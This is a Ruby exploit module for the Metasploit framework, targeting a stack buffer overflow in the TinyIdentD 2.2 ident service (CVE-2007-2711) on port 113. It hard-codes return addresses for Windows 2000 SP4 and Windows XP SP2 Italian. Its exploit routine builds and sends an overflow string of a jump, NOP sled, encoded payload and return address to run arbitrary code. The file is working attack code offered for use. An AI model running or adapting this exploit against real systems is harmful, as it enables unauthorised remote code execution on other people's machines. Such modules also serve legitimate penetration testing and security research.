##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TinyIdentD 2.2 Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack based buffer overflow in TinyIdentD version 2.2.
        If we send a long string to the ident service we can overwrite the return
        address and execute arbitrary code. Credit to Maarten Boone.
      },
      'Author'         => 'Jacopo Cervini <acaro[at]jervus.it>',
      'References'     =>
        [
          ['CVE', '2007-2711'],
          ['OSVDB', '36053'],
          ['BID', '23981'],
        ],
      'Payload'        =>
        {
          'Space'    => 400,
          'BadChars' => "\x00\x0d\x20\x0a"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 2000 Server SP4 English',   { 'Ret' => 0x7c2d15e7, } ], # call esi
          ['Windows XP SP2 Italian',            { 'Ret' => 0x77f46eda, } ], # call esi

        ],
      'Privileged'     => false,
      'DisclosureDate' => 'May 14 2007'
      ))

    register_options([ Opt::RPORT(113) ], self.class)
  end

  def exploit
    connect

    pattern  = "\xeb\x20"+", 28 : USERID : UNIX :";
    pattern << make_nops(0x1eb - payload.encoded.length)
    pattern << payload.encoded
    pattern << [ target.ret ].pack('V')


    request  = pattern + "\n"

    print_status("Trying #{target.name} using address at #{"0x%.8x" % target.ret }...")

    sock.put(request)


    handler
    disconnect
  end

end
